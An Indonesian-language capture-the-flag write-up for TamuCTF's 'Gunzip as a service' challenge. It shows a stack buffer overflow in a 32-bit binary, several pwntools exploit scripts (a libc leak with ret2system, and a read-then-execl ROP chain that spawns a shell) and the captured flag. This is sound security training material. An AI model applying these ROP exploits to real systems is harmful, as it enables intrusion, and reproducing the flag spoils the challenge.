<h1 align="center">Gunzip as a service</h1>

## Description

We only accept gzip file

### File

[gunzipasaservice](./gunzipasaservice)

## Solution

Diberikan binary dengan detail sebagai berikut.
```
gunzipasaservice: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=38e7732cebbb69b9d9c4ff9648f3d21cf048a056, for GNU/Linux 3.2.0, not stripped
[*] '/home/chao/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE/gunzipasaservice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Dapat kami pastikan bahwa binary tersebut merupakan ELF berupa **32 bit**, **dynamically linked** dan **not stripped**.
Kami mencoba run binary tersebut, dan berikut merupakan hasilnya
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
13:27:03 › ./gunzipasaservice 
AAAA

gzip: stdin: not in gzip format
```
Sepertinya binary tersebut meminta input berupa **gzip**. Setelah beberapa saat berpikir, kami mencoba untuk memasukkan **raw data** dari file **gzip**.<br>
Kami pun membuat file bernama **test** dan mengisi file tersebut dengan karakter **AAAA**, lalu kami zip file tersebut kemudian kami meng-inputkan raw data dari file yang sudah di zip ke binary tersebut.<br>
Berikut merupakan output dari binary tersebut.
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
13:33:25 › cat test.gz | ./gunzipasaservice
AAAA%
```
Nah, kali ini inputan kita terbaca sebagai **'AAAA'** tanpa ada nya error pada **gzip** format. Sekarang yang perlu kami lakukan adalah mencari padding yang tepat agar dapat melakukan overwrite pada return address, langsung saja kami lihat jarak dari **EBP** ke variabel inputan kita dengan **IDA Pro**.<br>
Berikut merupakan hasilnya.<br>
```
size_t gunzip()
{
  char ptr; // [esp+4h] [ebp-414h]
  char s; // [esp+204h] [ebp-214h]
  int v3; // [esp+404h] [ebp-14h]
  int fd; // [esp+408h] [ebp-10h]
  size_t n; // [esp+40Ch] [ebp-Ch]

  subprocess("gunzip", &fd, &v3);
  memset(&s, 0, 0x200u);
  n = read(0, &s, 0x200u);
  write(fd, &s, n);
  close(fd);
  memset(&ptr, 0, 0x200u);
  gets_fd(&ptr, v3);
  return fwrite(&ptr, 1u, 0x200u, stdout);
}
```
Dari yang terlihat pada **pseudocode** tersebut, kami menyimpulkan bahwa inputan kita disimpan pada variabel **ptr** yang terletak di **EBP-0x414**.<br>
Karena **return address** terletak pada **EBP+0x4**, artinya untuk mengoverwrite return address kita memerlukan padding sebanyak **0x414 + 0x4** == **0x418**(**1048** dalam decimal).<br>
Untuk memastikan bahwa padding tersebut benar, kami mencoba untuk meng-overwrite **return address** menjadi **main** sehingga program akan kembali ke main saat return, jika program memberikan output berupa **EOF** artinya padding yang kami perhitungkan salah. Namun seharusnya bisa kami cek di **gdb** untuk melihat kemana return address tersebut di-alihkan, sayang sekali kami tidak bisa memasang **break-point** di **gdb** karena program langsung meng-exec **/bin/sh** untuk melakukan unzipping(Jika /bin/sh di exec di gdb maka akan mengabaikan breakpoint dan langsung **EOF**) sehingga kami harus melakukan debugging secara **blind** tanpa gdb.<br>
Berikut merupakan script exploit yang kami buat untuk merubah return address menjadi main.<br>
```
def exploit3():
    p = process("./gunzipasaservice")
    #p = remote("challenges.tamuctf.com", 4709)
    binary = ELF("./gunzipasaservice")
    bss = 0x0804c044 + 0x100
    add_esp = 0x08049475    # add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.symbols['main'])
    
    open("rop", "w+").write(payload)
    os.system("gzip rop")

    rop = open("rop.gz", "rb").read()
    p.send(rop)

    p.interactive()

if __name__ == "__main__":
   exploit3()
```
Dan berikut merupakan outputya.<br>
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
13:52:50 › python payChristo.py
[+] Starting local process './gunzipasaservice': pid 11290
[*] '/home/chao/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE/gunzipasaservice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ 
```
Betapa bahagianya kami setelah melihat bahwa tidak terjadi **EOF** pada program, dan sepertinya program tersebut meminta sebuah input. Kami-pun menginputkan karakter berupa **AAAA**, saat ini seharusnya terjadi gzip error format dan **EOF**. Dan berikut merupakan outputnya. <br>
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
14:03:35 › python payChristo.py
[+] Starting local process './gunzipasaservice': pid 11519
[*] '/home/chao/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE/gunzipasaservice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ AAAA

gzip: stdin: not in gzip format
[*] Got EOF while reading in interactive
$  
```
Dan benar saja, inputan kami-pun terbaca. Namun karena format inputan kami bukan merupakan **gzip** maka terjadi error.<br>
Di stage ini, kami berhasil memastikan padding yang benar yaitu **1048**. Lanjut ke stage berikutnya, kami mencoba untuk melakukan ROP dengan memanggil **system('/bin/sh')** pada libc.<br>
Berikut merupakan scriptnya.<br>
```
def exploit1():
    # p = process("./gunzipasaservice")
    p = remote("challenges.tamuctf.com", 4709)
    binary = ELF("./gunzipasaservice")
    bss = 0x0804c044 + 0x100

    # payload = open("test.gz", "rb").read()
    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.plt['write'])
    payload += p32(binary.symbols['main'])
    payload += p32(1)
    payload += p32(binary.got['read'])
    payload += p32(0x10)

    open("leak", "w+").write(payload)
    os.system("gzip leak")

    leak = open("leak.gz", "rb").read()

    p.send(leak)
    os.system("rm leak.gz")

    libc_leak = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    # libc_base = libc_leak - 0x018d90
    libc_base = libc_leak - 0x0ba2d0
    log.info("Libc base : {}".format(hex(libc_base)))
    # libc_system = libc_base + 0x03d200
    libc_system = libc_base + 0x035980
    log.info("Libc system : {}".format(hex(libc_system)))
    # libc_binsh = libc_base + 0x17e0cf
    libc_binsh = libc_base + 0x16026c
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.symbols['read'])
    payload += p32(binary.symbols['main'])
    payload += p32(0)
    payload += p32(bss)
    payload += p32(0x10)

    open("read_binsh", "w+").write(payload)
    os.system("gzip read_binsh")

    read_binsh = open("read_binsh.gz", "rb").read()
    p.send(read_binsh)
    os.system("rm read_binsh.gz")
    p.send("/bin/sh\x00")

    payload = ''
    payload += 'A' * 1048
    # payload += p32(0x0804931f)
    payload += p32(libc_system)
    payload += 'JUNK'
    payload += p32(bss)

    open("payload", "w+").write(payload)
    os.system("gzip payload")

    real_payload = open("payload.gz", "rb").read()

    p.send(real_payload)
    os.system("rm payload.gz")

    p.interactive()

if __name__ == "__main__":
    exploit1()
```
Dan berikut merupakan hasilnya, kami berhasil mendapatkan shell di local. <br>
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
14:10:48 › python payChristo.py
[+] Starting local process './gunzipasaservice': pid 12467
[*] '/home/chao/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE/gunzipasaservice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Libc leak : 0xf7dfacb0
[*] Libc base : 0xf7d14000
[*] Libc system : 0xf7d51200
[*] Libc /bin/sh : 0xf7e920cf
[*] Switching to interactive mode
\xb0\xb2��\xa0\xb7����ls
core              gunzipasaservice.id1  img1.png       rop.gz
flag.txt          gunzipasaservice.id2  payAldo.py       test.gz
gunzipasaservice      gunzipasaservice.nam  payChristo.py
gunzipasaservice.id0  gunzipasaservice.til  README.md
$ id
uid=1000(chao) gid=1000(chao) groups=1000(chao),4(adm),24(cdrom),27(sudo),29(audio),30(dip),46(plugdev),116(lpadmin),126(sambashare),129(kvm),999(docker)
$  
```
NAMUN SAYANG SEKALI, kami menemukan kasus umum.<br>
```
localhost -> shell
remote -> EOF
```
Hal pertama yang kami pikirkan merupakan karena libc yang berbeda, namun kami sudah mencoba beberapa kemungkinan libc yang dipakai dan tetap mendapatkan **EOF** di remote.<br>
Setelah beberapa saat berpikir, kami menyimpulkan mungkin address **system** atau **/bin/sh** dari libc yang di leak tidak tepat sehingga kami harus mencari alternative untuk mendapatkan shell.<br>
Setelah melihat beberapa fungsi dengan command `elfsymbol` pada gdb, kami baru menyadari bahwa binary memiliki fungsi `execl` yang dapat memanggil shell. Namun kendala-nya disini adalah kami tidak tahu dimana letak string **'/bin/sh'** sehingga kami memutuskan untuk meng-inputkan sendiri string tersebut dengan **ROP** yang dapat kita manfaatkan dari bug buffer-overflow.<br>
Langsung saja kami modifikasi script exploit-nya, berikut merupakan script-nya.
```
def exploit2():
    # p = process("./gunzipasaservice")
    p = remote("challenges.tamuctf.com", 4709)
    binary = ELF("./gunzipasaservice")
    bss = 0x0804c044 + 0x100

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.symbols['read'])
    payload += p32(binary.symbols['main'])
    payload += p32(0)
    payload += p32(bss)
    payload += p32(0x10)

    open("read_binsh", "w+").write(payload)
    os.system("gzip read_binsh")

    read_binsh = open("read_binsh.gz", "rb").read()
    p.send(read_binsh)
    os.system("rm read_binsh.gz")
    p.send("/bin/sh\x00")

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.plt['execl'])
    payload += 'JUNK'
    payload += p32(bss)
    payload += p32(0)
    payload += p32(0)

    open("payload", "w+").write(payload)
    os.system("gzip payload")

    real_payload = open("payload.gz", "rb").read()
    p.send(real_payload)
    os.system("rm payload.gz")

    p.interactive()

if __name__ == "__main__":
    exploit2()
```
Kali ini di local, kami mendapatkan shell lagi.
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
14:20:15 › python payChristo.py
[+] Starting local process './gunzipasaservice': pid 12862
[*] '/home/chao/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE/gunzipasaservice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ ls
core              gunzipasaservice.id1  img1.png       rop.gz
flag.txt          gunzipasaservice.id2  payAldo.py       test.gz
gunzipasaservice      gunzipasaservice.nam  payChristo.py
gunzipasaservice.id0  gunzipasaservice.til  README.md
$ id
uid=1000(chao) gid=1000(chao) groups=1000(chao),4(adm),24(cdrom),27(sudo),29(audio),30(dip),46(plugdev),116(lpadmin),126(sambashare),129(kvm),999(docker)
$ 
```
Namun sayang sekali **LAGI LAGI** kami mendapatkan **EOF** di remote host ^o^.<br>
Pada stage ini kami sangat ingin berkata kasar, namun kami tahan karena kami masih memiliki ide lain.<br>
Pada script modifikasi terakhir kami, kami melakukan **ROP** sebanyak 2 kali, mungkin **ROP** kedua tidak diterima oleh binary. Nah kali ini, kami melakukan input **ROPchain** sebanyak 1 kali saja dengan melakukan bayang bayang dan imajinasi terhadap stack :).<br>
Berikut merupakan stackframe yang kami bayangkan untuk membuat **ROPchain**.<br>
```
+--------------+
|  "A" * 1048  |    // padding untuk melakukan overwrite return address
+--------------+
|     Read     |    // return address
+--------------+
|    Gadget    |    // add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 
+--------------+
| argumen1(fd) |    // file descriptor, untuk stdin adalah 0
+--------------+
| argumen2(bss)|    // address tujuan, untuk kasus ini saya isi bss
+--------------+
| argumen3(len)|    // panjang input, bebas berapa-pun asal mencukupi untuk mengisi string '/bin/sh'
+--------------+
|     ebx      |    // Mengisi ebx, karena di pop
+--------------+
|     esi      |    // Mengisi esi, karena di pop
+--------------+
|     edi      |    // Mengisi edi, karena di pop
+--------------+
|     ebp      |    // Mengisi ebp, karena di pop
+--------------+
|    execl     |    // Memanggil fungsi execl
+--------------+
|     JUNK     |
+--------------+
| argumen1(bss)|    // Karena string /bin/sh sudah kami inputkan di bss, maka kami hanya perlua mengisi bss sebagai argumen
+--------------+
|  argumen2(0) |    // Untuk memanggil shell, argumen 2 dan 3 kita berikan null
+--------------+
|  argumen3(0) |    // Untuk memanggil shell, argumen 2 dan 3 kita berikan null. Jika disederhanakan akan menjadi seperti execl('/bin/sh, 0, 0)
+--------------+
```
Setelah membayangkan stackframe tersebut, kami mencoba untuk membuat exploit yang baru lagi.<br>
Berikut merupakan script hasil modifikasi terakhir kami.<br>
```
def exploit3():
    p = process("./gunzipasaservice")
    #p = remote("challenges.tamuctf.com", 4709)
    binary = ELF("./gunzipasaservice")
    bss = 0x0804c044 + 0x100
    add_esp = 0x08049475    # add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.symbols['read'])
    payload += p32(add_esp)
    payload += p32(0)                       # 4
    payload += p32(bss)                     # 8
    payload += p32(0x10)                    # 12
    payload += p32(0)                       # ebx
    payload += p32(0)                       # esi
    payload += p32(0)                       # edi
    payload += p32(0)                       # ebp
    payload += p32(binary.plt['execl'])
    payload += 'JUNK'
    payload += p32(bss)
    payload += p32(0)
    payload += p32(0)

    open("rop", "w+").write(payload)
    os.system("gzip rop")

    rop = open("rop.gz", "rb").read()
    p.send(rop)
    os.system("rm rop.gz")
    p.send("/bin/sh\x00")

    p.interactive()

if __name__ == "__main__":
   exploit3()
```
Saat kami coba di local, senangnya kami melihat shell berhasil didapatkan :D.
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
14:40:46 › python payChristo.py
[+] Starting local process './gunzipasaservice': pid 13701
[*] '/home/chao/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE/gunzipasaservice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ ls
core              gunzipasaservice.id1  img1.png       test.gz
flag.txt          gunzipasaservice.id2  payAldo.py
gunzipasaservice      gunzipasaservice.nam  payChristo.py
gunzipasaservice.id0  gunzipasaservice.til  README.md
$ id
uid=1000(chao) gid=1000(chao) groups=1000(chao),4(adm),24(cdrom),27(sudo),29(audio),30(dip),46(plugdev),116(lpadmin),126(sambashare),129(kvm),999(docker)
$  
```
Saat kami coba di remote host, kami-pun akhirnya berhasil mendapatkan shell.<br>
Betapa bahagianya kami karena usaha kami terbayarkan wkowkwokw :v.<br>
Namun karena remote host sudah mati, jadi kami lampirkan hasil di local. <br>
```
chao at Yu in [~/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE]  on git:master ✗  bcdc4b3 "update readme"
14:43:23 › python payChristo.py
[+] Starting local process './gunzipasaservice': pid 13788
[*] '/home/chao/Documents/KSL/WriteUp-CTF/TamuCTF/PWN/GUNZIP_AS_SERVICE/gunzipasaservice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
$ cat flag.txt
gigem{r0p_71m3}
$  
```

### Flag

```
gigem{r0p_71m3}
```
